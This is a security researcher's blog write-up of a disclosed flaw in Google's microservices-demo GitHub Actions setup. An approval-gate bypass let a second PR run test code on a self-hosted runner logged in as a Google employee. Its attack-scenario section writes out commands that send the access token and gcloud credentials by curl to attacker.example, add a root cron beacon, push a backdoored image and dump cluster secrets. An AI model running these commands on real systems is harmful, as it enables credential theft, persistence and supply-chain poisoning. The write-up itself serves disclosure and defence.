---
title: "From Contributor to Google Employee: RCE with 14,000+ GCP Projects"
date: 2026-10-13 08:00:00 +0300
categories: [Security Research, CI/CD Security]
tags: [vulnerability, google, google-vrp, rce, self-hosted-runners, gcp, github-actions, ci-cd-security, privilege-escalation, credential-theft, gke, google-kubernetes-engine,  approval-gate-bypass]
pin: true
image:
  path: /assets/img/google-microservices-demo-pixel.gif
---

## Summary

I demonstrated remote code execution (RCE) on Google's CI infrastructure with just **two pull requests** (PR) to their `microservices-demo` repository. The second PR auto-triggered on a self-hosted runner that was logged in as a **Google employee's account**, with visibility into **14,000+ GCP projects** across **40+ organizations**, together with kubectl access to a shared GKE cluster running other PRs' deployments, write access to Google's Artifact Registry for this demo, and passwordless sudo on the runner. The whole chain needed no social engineering and no zero-days, only GitHub Actions' approval gate settings.

**What the proof of concept exposed**:
- Google employee account: `o*****s@google.com`
- 14,000+ GCP projects across 40+ organizations, including the main Google organization, internal Google organizations and an acquired company
- Two GKE clusters, with kubectl (Kubernetes CLI) access to the PR testing cluster
- Artifact Registry (Google's container image storage service) with **write** access to the demo's PR images
- Passwordless sudo on persistent GCE (Google Compute Engine) runner
- Docker socket access (root-equivalent on the host)

![14,694 Google Cloud projects scrolling past, names blurred](/assets/img/google-microservice-blured_projects.gif){: width="1000" }
*14,694 Google Cloud projects, listed from a CI runner (names blurred)*

## Background

### What is microservices-demo?

[microservices-demo](https://github.com/GoogleCloudPlatform/microservices-demo) (also known as "Online Boutique") is Google's flagship Kubernetes demo application, a polyglot microservices architecture used to showcase GCP (Google Cloud Platform).

![Repository Statistics](/assets/img/google-microservice-stat.png){: width="800" }
*Repository scale: 20.8K stars, 10.3K forks, a widely adopted reference architecture*

**Repository Scale**:
- 20,000+ GitHub stars, 10,000+ forks
- Google's official reference architecture for GKE (Google Kubernetes Engine)
- Actively maintained with regular external contributions
- Uses **real Google Cloud infrastructure** for CI/CD

### GitHub Runners
A runner is the machine that executes a GitHub Actions workflow. Each job declares where it should run with `runs-on`, and GitHub hands it to a matching runner, which checks out the code and runs the job's steps. Whatever the job runs, from tests to build scripts, executes on that machine with whatever access the machine has. Runners come in two types:

- **GitHub-hosted runners**: Ephemeral virtual machines provided by GitHub. Fresh VM for each job, isolated from your infrastructure, automatically cleaned up after execution.

- **Self-hosted runners**: Infrastructure you manage and maintain (GCE VMs, EC2 instances, bare metal). Persistent, can run for days/months, have network access to your VPC (Virtual Private Cloud), require manual security hardening.

There can be multiple reasons organizations choose self-hosted runners:
- **Cost savings**: Avoid GitHub Actions minutes charges for large-scale CI/CD
- **Custom hardware requirements**: GPU access, specialized CPUs, or large RAM configurations
- **Network access**: Need to reach internal VPCs, databases, or private infrastructure
- **Compliance**: Data residency or regulatory requirements preventing use of GitHub's infrastructure

**Why this matters**: Self-hosted runners are more dangerous when compromised: they're persistent, have access to your internal network and infrastructure, and can be backdoored to affect future jobs. A compromised self-hosted runner can expose your entire internal ecosystem: VPCs, databases, internal services, and any credentials stored on or accessible from the runner.

### Pull Request Triggers

GitHub has two triggers that run workflows on pull requests, with opposite trade-offs:
- **`pull_request`** runs the PR's own code. For PRs from forks, GitHub passes no secrets and gives only a read-only token. That's only a protection if the runner itself holds nothing; on a self-hosted runner, whatever credentials live on the machine are exposed.
- **`pull_request_target`** runs the base repository's workflow with secrets and a write token. It's safe only as long as it never checks out and runs the PR's code.

### PWN Request

A `PWN Request` is an attack where a pull request gets a CI/CD (Continuous Integration/Continuous Deployment) workflow to run the attacker's code with privileges it shouldn't have. The term comes from GitHub Security Lab's [Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (2021), which describes the classic case: a `pull_request_target` workflow that checks out and runs PR code while holding the repository's secrets and a write token. The same idea applies whenever untrusted PR code runs somewhere privileged:
- With access to secrets
- With a token that can write to the repository
- On infrastructure with privileged access, like the self-hosted runner in this case

The classic PWN Request scenario:
1. External contributor opens malicious PR
2. Workflow triggers automatically with the PR's code
3. Attacker's code runs on the organization's infrastructure with secrets/credentials

### Approval Gates

The approval gate here is a repository setting (Settings → Actions → General) that decides which pull requests from forks need a maintainer's approval before their workflows run. GitHub offers three options:

1. **`Require approval for first-time contributors who are new to GitHub`**: Only users who are both new on GitHub AND have never contributed to this repository require approval
2. **`Require approval for first-time contributors`**: Only users who have never contributed to this repository require approval
3. **`Require approval for all external contributors`**: All users outside the repository/organization require approval (the most secure of the three)

Some repositories use the second option as a middle ground, trusting "known contributors" who've had at least one PR merged, while still gating first-time contributors.

This is where the bypass happens.

![Jim's knowing look (The Office)](/assets/img/the-office-oh-shit.gif){: width="1000" }

## The Vulnerability

### Vulnerable Workflow Configuration

As part of my hunting, I ran into the [`microservices-demo`](https://github.com/GoogleCloudPlatform/microservices-demo) repository, and specifically its pull request workflow, [ci-pr.yaml](https://github.com/GoogleCloudPlatform/microservices-demo/blob/424ae5bd0874a731a2685a0f4dd66c785cd591e5/.github/workflows/ci-pr.yaml), where several settings made the stars align into a vulnerability:

**1. Unsafe Pull Request Trigger**

{% raw %}
```yaml
on:
  pull_request:  # triggers on PRs from forks
    branches: [main]
```
{% endraw %}

This workflow uses `pull_request`, so it runs the PR's own code: test files, build scripts, anything in the fork. GitHub withholds secrets from fork PRs, but as the next points show, this runner held credentials of its own.


**2. Code Execution in Tests**

{% raw %}
```yaml
code-tests:
  steps:
  - uses: actions/checkout@v6   # the PR's code
  - name: Go Unit Tests
    run: |
      cd src/shippingservice
      go test                   # runs the PR's test functions
```
{% endraw %}

The workflow runs `go test` against packages from the PR, and Go runs every test function it finds in them. A PR that adds a test function gets arbitrary code executed on the runner.

**3. Self-Hosted Runners**

{% raw %}
```yaml
jobs:
  code-tests:
    runs-on: [self-hosted, is-enabled]   # a Google GCE VM
  deployment-tests:
    runs-on: [self-hosted, is-enabled]   # the same VM
```
{% endraw %}

The jobs ran on a self-hosted GCE VM in Google's CI project, not on a GitHub-hosted runner. What that VM exposed is covered in the Findings.

**4. Builds and Deploys from Untrusted Code**

{% raw %}
```yaml
deployment-tests:
  needs: code-tests
  steps:
  - uses: actions/checkout@v6
    with:
      ref: ${{ github.event.pull_request.head.sha }}   # the PR's code
  - name: Build + Deploy PR images to GKE
    run: |
      # Docker pushes authenticate with the runner's gcloud login
      gcloud auth configure-docker us-docker.pkg.dev
      # kubectl into the shared PR cluster
      gcloud container clusters get-credentials $PR_CLUSTER
      # each PR gets its own namespace, e.g. pr3283
      kubectl create namespace pr$PR_NUMBER
      # build the PR's code, push it to the refs repository, deploy it
      skaffold run --default-repo=$REGISTRY/refs/pull/$PR_NUMBER
    env:
      REGISTRY: us-docker.pkg.dev/o********-ci
      PR_CLUSTER: p******-cluster
```
{% endraw %}

The `deployment-tests` job:
- Checks out the exact PR code (explicitly using `head.sha`)
- Builds Docker images from attacker-controlled source
- Pushes them to the `refs` repository in Google's Artifact Registry, authenticated as the runner's gcloud account
- Deploys them into the PR's own namespace in the shared PR cluster

> **Note**: This is a simplified version. See the [complete workflow](https://github.com/GoogleCloudPlatform/microservices-demo/blob/424ae5bd0874a731a2685a0f4dd66c785cd591e5/.github/workflows/ci-pr.yaml) for full details.

But when I tried to create a PR, I noticed it required manual maintainer approval to run the `ci-pr.yaml` workflow, likely using either the **`Require approval for first-time contributors`** or **`Require approval for all external contributors`** policy.

### The Two-PR Bypass

The attack pattern is simple:

1. **Get one legitimate PR merged** (typo fix, runtime improvement, test coverage improvement, etc.)
2. **Gain "known contributor" status** which means that future PRs auto-execute on runners without approval
3. **Create second PR** → Triggers directly, no approval gate

This is the pattern my proof of concept demonstrated.

![Two-PR Bypass Attack Flow](/assets/img/google-microservice-two-pr-bypass-flow.png){: width="1000" }
*The two-PR approval bypass attack chain: Phase 1 establishes trust through legitimate contribution, Phase 2 exploits auto-approval to bypass security gates*

So if they were using the less strict "first-time contributors" policy, a single merged PR would be enough to skip the approval gate. To find out which policy was in place, I went through the repository's workflow run history and matched each run to who triggered it: maintainers, returning contributors and first-timers. Runs from returning contributors started right away, while runs from first-timers waited for approval. That pattern matches "Require approval for first-time contributors" rather than the stricter "all external contributors" option.

### POC

**Phase 1: Establish Contributor Status**

**March 14, 2026**: I submitted PR #3276, a legitimate cleanup of the `shippingservice` package:
- Removed deprecated API usage
- Fixed quote calculation logic
- Improved test coverage

**Result**: Reviewed and [merged on March 18](https://github.com/GoogleCloudPlatform/microservices-demo/commit/fc3a1f72ed3b66bc593bedb184a1544016171f89). I was now a "known contributor". 🎖️

---

**Phase 2: Run the Proof of Concept**

**March 19, 2026**: I submitted PR #3283:
- Added what looked like edge-case tests for `shippingservice`
- One test function downloaded and ran a reconnaissance script during `go test`, to measure what the runner could access

**Result**: CI auto-triggered on self-hosted runner with **no approval gate** (known contributor bypass confirmed)

![Complete Attack Flow](/assets/img/google-microservice-attack-flow-summary.png){: width="1000" }
*Complete attack chain: From legitimate contribution to RCE*

**Workflow run**: #23283042076

> Both PRs and the workflow run are no longer visible on GitHub. The merged code from PR #3276 is still in the repository's history.
{: .prompt-info }

I waited for my server to receive the request with the recon script results, but I got an error on my listener: the request failed because it was limited to 1 MB, which I naively thought was more than enough.

![Gru's plan: get a PR merged, open a second PR with a payload, CI runs it with no approval, my own listener rejects the results](/assets/img/gru-plan-listener.png){: width="600" }

Half nervous, half excited, I increased the request size to 5 MB and reran the workflow. It worked: 2 MB of recon output, 18,425 lines, sent back to my server.


## Findings

The proof of concept ran a **basic reconnaissance** script to understand the blast radius:

```bash
# Standard impact assessment commands (excerpt)
whoami
gcloud auth list
gcloud config list
gcloud projects list
gcloud organizations list
kubectl config view
kubectl cluster-info
```

**What I expected to find**:
- A service account (SA)
- Access limited to the demo's CI project (`o********-ci`)
- Only the permissions CI needs, like pushing images to Artifact Registry

![Penguins of Madagascar walking into a vault full of gold](/assets/img/the-penguins-of-madagascar.gif){: width="1000" }

### Finding 1: A Human Google Employee Identity

**Runner Identity**:
```
Hostname: gce-2025-07-25-***  # name suggests July 2025; uptime was 7 days
User: o*****s (Google employee)
Active GCP Account: o*****s@google.com
GCP Project: o********-ci
```

This wasn't a minimal SA scoped to the CI project, this was a **human Google employee** account, with either significant organizational responsibility or simply overly permissive permissions. My money is on the second.

![Is this a pigeon meme: me, pointing at o*****s@google.com, asking "Is this a CI service account?"](/assets/img/is-this-a-ci-service-account.png){: width="450" }

**Cross-Project Visibility**

The most unexpected finding: GCP credentials could enumerate **14,694 projects across 45 organizations**.

**Organizations visible**:
- **The main Google organization**
- **24 internal Google service organizations**
- **12 Google test organizations**
- **An acquired company**
- **A handful of others** I couldn't attribute

**Project categories enumerated**:

Going by project names, these included:
- **Advertising and billing**: ad platform and billing projects
- **Internal Google corporate infrastructure**: internal tooling and corporate systems
- **GKE/Kubernetes**: container orchestration, including GKE release projects
- **Android**: Android release farms and platform projects
- **Security & authentication**: Binary Authorization and authentication projects
- **Chrome**: Chrome release infrastructure
- **AI/ML**: AI platform and Vertex AI projects
- And many more across Google's production and development infrastructure

![Infrastructure Blast Radius](/assets/img/google-microservice-blast-radius.png){: width="1000" }
*Blast radius visualization: Single compromised runner → Google employee account → 45 organizations → 14,694 GCP projects*

---

### Finding 2: Root on a Persistent Runner

The GitHub runner agent was installed in the employee's own home directory (`/home/o*****s/actions-runner`) and ran as their Linux user, on a VM that had been up for 7 days:

```
# id
uid=1000(o*****s) gid=1001(o*****s) groups=...,994(docker),1000(google-sudoers)

# uptime
up 7 days, 14:33
```

- **Passwordless sudo**: the user is in `google-sudoers`, the group GCE grants passwordless sudo, and `sudo -n true` succeeded without a password. Root on the VM.
- **Docker socket writable**: as a member of the `docker` group, the user had full control of the Docker daemon, which on its own is equivalent to root on the host.
- **Persistent**: Docker held 550 images and 74 stopped containers left over on the host. Anything a PR left on this VM would still be there for the next one.

---

### Finding 3: Write Access to Google's Artifact Registry

The CI project hosted two Artifact Registry repositories: `refs`, holding the images built for every PR, and `charts`, holding the Helm charts and release artifacts.

**The runner pushed images to `refs` as the Google employee.** Its Docker credential helper for `us-docker.pkg.dev` was `gcloud`, so every push authenticated as the employee account, and its local Docker store held images for 140 PRs (#2799 to #3283), all tagged for `refs`.

```
# ~/.docker/config.json on the runner
{
  "credHelpers": {
    "us-docker.pkg.dev": "gcloud",
    "us-central1-docker.pkg.dev": "gcloud"
  }
}

# docker images (excerpt, 140 PRs in total)
REPOSITORY                                                           TAG
us-docker.pkg.dev/o********-ci/refs/pull/3283/shippingservice        3283
us-docker.pkg.dev/o********-ci/refs/pull/3282/frontend               3282
us-docker.pkg.dev/o********-ci/refs/pull/3281/checkoutservice        3281
us-docker.pkg.dev/o********-ci/refs/pull/3280/productcatalogservice  3280
```

Neither this nor the 14,694-project visibility came from the CI project's own IAM policy, which gave the employee account no Artifact Registry role at all.

The same account could also list the project's service accounts, including `github-action-runner` with `roles/container.admin` over the project's GKE clusters, and could potentially impersonate them (which I didn't test).

**The VM's own identity was one switch away**: the Compute Engine default SA (`8*****7-compute@developer.gserviceaccount.com`) holds `roles/editor` on the project, and `gcloud` on the runner already had its credentials from the metadata server, within the VM's OAuth scopes.

```
# gcloud auth list
ACTIVE  ACCOUNT
        8*****7-compute@developer.gserviceaccount.com
*       o*****s@google.com
```

---

### Finding 4: A Shared PR Cluster

The CI project ran two GKE clusters. **kubectl on the runner was already connected** to the PR testing cluster, a GKE Autopilot cluster where every PR gets deployed into its own namespace:

```
NAMESPACE    STATUS   AGE
pr3268       Active   2d15h
pr3269       Active   7d9h
pr3280       Active   17h
pr3281       Active   9h
pr3282       Active   9h
pr3283       Active   6m7s    # My own PR
prmain       Active   7d9h
prrelease    Active   7d10h
```

Some of the other PR namespaces ran the complete 12-service stack behind a public LoadBalancer. All of them shared one cluster and one credential, so any PR, including mine, could see every other deployment, and the same credentials could list Kubernetes secrets across the cluster (at the time, only GKE's own monitoring secrets).

---

### Where I Stopped

The moment `gcloud projects list` returned **14,694 projects** and `gcloud organizations list` showed **45 organizations**, I knew I'd crossed into unexpected territory.

I immediately closed the PR and started writing the report to Google with all sensitive information redacted before submitting.

![Abe Simpson walking in, then turning around and walking out](/assets/img/Abe_Simpson_walking_out.gif){: width="450" }

**Scope of testing**: I deliberately limited reconnaissance to listing resources (`gcloud projects list`, `gcloud organizations list`, etc.). I didn't attempt to access resources in other projects or organizations, only enumerated what was visible. No project names or specific identifiers are disclosed in this writeup to protect Google's infrastructure.

**From my VRP (Vulnerability Reward Program) report**:
> "I deliberately kept this POC to read-only reconnaissance. […] I didn't pursue any of those."

**What I'd do differently next time**: check the identity before running a full recon. My script ran everything in one go, so `gcloud projects list` exposed thousands of Google's project names before I ever saw whose account it was. The first command should be `gcloud auth list`. If the runner holds a human identity, that alone is the finding: stop and report it right there, before any enumeration.

![Drake meme: no to running the full recon in one go, yes to gcloud auth list first](/assets/img/drake-recon-order.png){: width="400" }


## Attack Scenarios

### Scenario 1: Employee Credential Theft

With the employee account `o*****s@google.com`, an attacker could:
- Take its credentials off the runner: an access token works from any machine for about an hour, and the credentials gcloud stores in `~/.config/gcloud` could potentially keep working much longer
- Explore the 14,694 visible projects and the IAM policies across 45 organizations, looking for resources the account can reach beyond listing
- Potentially impersonate the CI project's service accounts

```bash
# the employee's access token, usable from any machine for about an hour
gcloud auth print-access-token | curl -X POST https://attacker.example/exfil --data-binary @-

# gcloud's stored credentials for the account
tar czf - ~/.config/gcloud | curl -X POST https://attacker.example/exfil --data-binary @-
```

---

### Scenario 2: Persistent Runner Backdoor

With root on the runner, an attacker could:
- Backdoor the runner agent in the employee's home directory, so every later job runs through it, including the main-branch pipeline, which ran on the same runner
- Install persistence (cron, systemd, SSH keys) that survives across workflow runs
- Keep collecting the credentials later jobs bring to the machine
- Use the VM's own service account token from the metadata server, within its OAuth scopes
- Potentially pivot to other machines on the project's VPC

```bash
# persistence that outlives the PR: runs every 5 minutes as root
echo '*/5 * * * * root /opt/.cache/beacon.sh' | sudo tee /etc/cron.d/runner-maint
```

---

### Scenario 3: Supply Chain Artifact Poisoning

The employee account can write to `refs`, and both the PR pipeline and the main-branch pipeline push their images there from this runner. An attacker could:
- Overwrite other PRs' or the main branch's images in `refs` with backdoored versions, potentially picked up the next time they're deployed
- Potentially tamper with the Helm charts and release artifacts in `charts`, if the account's write access reaches it, and through them reach anyone deploying this reference architecture

```bash
# overwrite a main-branch image in refs with a backdoored one
docker tag backdoored-frontend us-docker.pkg.dev/o********-ci/refs/heads/main/frontend:<sha>
docker push us-docker.pkg.dev/o********-ci/refs/heads/main/frontend:<sha>
```

---

### Scenario 4: Shared PR Cluster Compromise

With kubectl access to the shared PR cluster (`p******-cluster`), an attacker could:
- Read Kubernetes secrets across the cluster
- Access other PRs' deployments, and potentially modify them or inject backdoors into their running workloads
- Potentially run their own workloads, such as cryptominers, on Google's infrastructure and billing

```bash
# read secrets across the cluster
kubectl get secrets --all-namespaces -o yaml

# look into another PR's deployment
kubectl get pods -n pr3282

# run your own workload
kubectl apply -f malicious-deployment.yaml
```


## Takeaways

### Lesson 1: The Approval Gate Bypass

The approval gate only works if it applies to everyone. With either "first-time contributor" policy, a contributor stops being first-time once they have any commit or PR merged into the repository. After that, their PRs run workflows without approval. For sensitive workflows, ones with access to secrets, self-hosted runners or production infrastructure, this policy isn't a security boundary, only a slight delay for attackers. Require approval for all external contributors.

![Expanding brain meme: require approval for first-time contributors who are new to GitHub, then for first-time contributors, then for all external contributors](/assets/img/expanding-brain-approval-policy.png){: width="400" }

Any repository with this policy is exposed the same way. The setting isn't visible from outside, but the workflow history gives it away: who triggered each run (maintainer, returning contributor, first-timer) and whether it ran right away or waited for approval.

---

### Lesson 2: Human Accounts ≠ CI Identities

This sounds obvious, but it happened at Google, so it's worth saying: whether the runner is ephemeral or self-hosted, its CI identity should be a scoped service account, never a person. On a self-hosted runner it matters even more, because the credentials stay on the machine between jobs.

**A CI service account should**:
- Have only the permissions its task needs (the principle of least privilege, PoLP). If the task needs more than one project, that's fine; anything beyond the task isn't.
- Use short-lived credentials, like Workload Identity Federation, instead of long-lived keys or a user's login

**Human accounts usually have**:
- Access accumulated over years of employment
- Permissions across organizational boundaries
- Visibility into several (or thousands) of projects

**The consequence**: When the proof of concept ran on the runner, it didn't find the minimal CI credentials I expected. It found **a Google employee's GCP access**. Both CI identities and human accounts are supposed to follow PoLP, but human permissions keep changing as people join projects and change roles. That makes them hard to keep minimal, and more dangerous when exposed. This case is a good reason to review how employee permissions are maintained, and to keep human accounts off CI machines entirely.

---

### Lesson 3: Persistent Infrastructure ≠ Ephemeral Runners

Whatever the reason a company chooses self-hosted runners, the decision needs a security review too. [GitHub itself recommends](https://docs.github.com/en/actions/reference/security/secure-use#hardening-for-self-hosted-runners) self-hosted runners only for private repositories, because anyone who can open a PR on a public repository can run code on them. If you do use them for a public repository:
- **Make them ephemeral**: register runners with `--ephemeral`, so each one runs a single job and is replaced, leaving nothing behind for the next PR
- **Keep untrusted and trusted work apart**: PR jobs and main-branch builds shouldn't share a machine
- **Give the runner user nothing extra**: no sudo, no Docker group, no human credentials in its home directory
- **Limit what it can reach**: its own network and a scoped identity, not the project's default VPC and an editor service account

**PR environments need isolation too**: every PR was deployed into one shared cluster, reachable with the same credentials, so a single malicious PR could see all the others. Give each PR its own isolated environment and credentials.

---

### Lesson 4: Demo Code Has Real Infrastructure

It's easy to treat a demo repository as low risk. This case shows why that's a mistake: the infrastructure behind **Google's demo** was **real Google Cloud**. A long-running GCE VM, GKE clusters, an Artifact Registry fed by the main-branch pipeline, and a Google employee's account with visibility into 14,694 projects across 45 organizations.

Even if you never intended the demo code to be secure, the **infrastructure running it** must be.

---

### Check Your Own Repositories

{% raw %}
- **Approval policy**: In Settings → Actions → General, check the approval setting for fork pull request workflows. With `Require approval for first-time contributors`, one merged PR is enough to skip approval; with the "new to GitHub" option, any established account skips it. Only `Require approval for all external contributors` holds.
- **PR code on self-hosted runners**: find jobs that run on self-hosted runners (`grep -rn "self-hosted" .github/workflows`), and check whether any of them is triggered by `pull_request`.
- **`pull_request_target` that runs PR code**: find workflows triggered by `pull_request_target` that check out the PR's code (`ref: ${{ github.event.pull_request.head.sha }}`) and then build or test it.
- **Runner identity**: On each self-hosted runner, check every identity a job could use, and make sure each one is a scoped service account, never a person:
  - Cloud CLIs: `gcloud auth list`, `aws sts get-caller-identity`, `az account show`
  - The machine's own cloud identity from the metadata service: a GCP service account, an AWS instance profile, an Azure managed identity
  - Credentials stored in the runner user's home directory, which matters on-premises too: `~/.config/gcloud`, `~/.aws`, `~/.azure`, `~/.kube/config`, `~/.docker/config.json`, `~/.ssh`
- **Runner persistence**: Check whether runners are registered with `--ephemeral`, and whether the runner user has sudo or Docker group membership.
- **Shared runners**: Check whether PR jobs and main-branch or release jobs use the same runner labels.
- **Shared PR environments**: Check whether PR preview environments from different PRs share one cluster or one credential.
{% endraw %}


## Disclosure Timeline & Response

The disclosure had an interesting arc:

**March 19, 2026**: Report submitted to Google's OSS VRP

**March 20, 2026**: Initial assessment: **"Won't Fix (Infeasible)"**

Google's reasoning:
> "The Pull Request from the attacker requires maintainer approval to run"

**March 21, 2026**: I pushed back with a detailed explanation of the **approval gate bypass**: no approval needed for known contributors

**March 23, 2026**: Google reopened the report

**March 27, 2026**: Google moved the report to the Google Cloud VRP queue

**April 5, 2026**: I sent a follow-up

**April 15, 2026**: Google marked it a duplicate of an existing report

**April 16, 2026**: I asked for clarification, concerned the report had fallen through the cracks after its many status changes

**April 23, 2026**: I followed up, and Google reopened the report for further analysis

**April 24, 2026**: Google accepted the report ("Nice catch!") and filed a bug with the product team

**April 28, 2026**: The Cloud VRP panel issued a reward at the standard amount for a security issue caused by misconfigurations or insecure deployments

**April 29, 2026**: I asked how the issue was classified for the reward

**May 26, 2026**: The panel kept its decision. They acknowledged the significant impact of the finding, but explained that their reward methodology avoids creating incentives for research that compromises Google employee accounts.

**May 26, 2026**: I asked for clarification on Google's boundaries, to conduct future research responsibly

**June 11, 2026**: After discussing it in both the Cloud and OSS reward panels, Google kept the decision, citing the limited impact to a demo repository

**August 9, 2026**: I shared the blog draft with Google and asked them to confirm the fix and what it included

**August 25, 2026**: Google's Product team confirmed the fixes

**September 8, 2026**: Google's team was validating the fix implemented by the Product team

**October 8, 2026**: Google marked the report **Fixed**

![The Rock shouting: 203 days and 33 comments later, status: fixed. Finally.](/assets/img/the-rock-finally-fixed.png){: width="500" }

**Lessons for the disclosure process**:
- Even experienced security teams can miss a bypass at first, as the initial assessment did.
- Duplicates are becoming more common, but if something feels off, ask. My report was marked a duplicate, and a polite request for clarification got it reopened and accepted.
- Appeals are heard: Google reopened the duplicate decision, and returned both reward questions to the panel, even though the reward itself didn't change.
- VRP scope definitions matter. I framed this as `RCE on Google infrastructure with credentials to 14,000+ projects and 40+ organizations`, but Google's assessment was `Demo repo misconfiguration`. The fact that it was a **demo repository** mattered to Google more than the fact that it was **Google's internal infrastructure**.
- Keep learning how each program evaluates reports, and tune your research to it.

---

### The Fix

**Confirmed by Google's Product team**:

1. **Migrated to GitHub-hosted runners**: Changed from `runs-on: [self-hosted, is-enabled]` to `runs-on: ubuntu-24.04`

2. **Changed workflow trigger**: After the report, the workflow first switched to `pull_request_target` (July 2026), then moved away from it into a `workflow_run` that has an always-on manual approval gate (August 2026). The sensitive deploy workflow now runs only after a separate CI workflow finishes, and only with manual approval.

3. **Implemented Workload Identity Federation**: The workflow now authenticates as an OIDC-authenticated service account. Before, the runner used the employee's own gcloud login.

4. **Approval required for all PRs**: The approval gate now applies to all pull requests, not just first-time contributors.

5. **Permission scoping**: The workflow now uses a slimmed-down service account with only minimal permissions: deploying on the CI/CD GKE cluster and writing to the staging Artifact Registry.


## Conclusion

Nothing here needed a zero-day, or any insider knowledge. The self-hosted runner and the PR code it ran were visible in the public workflow file, and the approval policy could be read from the public workflow history. The only hidden piece was whose credentials sat on the runner, and that turned out to be a Google employee's. Each piece looks harmless on its own; together, one merged PR turned a demo repository's CI into a Google employee's identity. The fix had to touch every layer: the approval gate, the runner, and the credentials behind it.

It's tempting to weigh a finding like this by the repository, and Google's panels did: "limited impact to a demo repo." But a demo repository is only as contained as the infrastructure behind it.

In the end, my shippingservice tests did exactly what tests are supposed to do: they found a problem. Just not in the shipping service.

## References

- [microservices-demo Repository](https://github.com/GoogleCloudPlatform/microservices-demo)
- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Docs: Approving workflow runs from forks](https://docs.github.com/en/actions/how-tos/manage-workflow-runs/approve-runs-from-forks)
- [GitHub Docs: Hardening for self-hosted runners](https://docs.github.com/en/actions/reference/security/secure-use#hardening-for-self-hosted-runners)
- [GitHub Docs: Ephemeral self-hosted runners](https://docs.github.com/en/actions/reference/runners/self-hosted-runners)
